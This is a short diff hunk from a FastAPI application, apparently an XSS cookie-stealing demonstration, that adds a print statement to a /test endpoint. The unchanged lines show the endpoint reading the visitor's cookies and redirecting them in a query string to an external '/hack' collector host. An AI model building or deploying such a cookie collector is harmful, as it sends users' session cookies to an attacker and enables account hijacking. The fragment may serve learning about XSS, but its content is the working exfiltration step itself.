@@ -47,6 +47,7 @@ def get_cookie(cookie: str):
 @app.get("/test")
 def test(request: Request):
     cookie = request.cookies
+    print(cookie)
     return RedirectResponse(f"https://knyazevi81-fastapi-xss-cookie-888f.twc1.net/hack?cookie={cookie}")
 
 
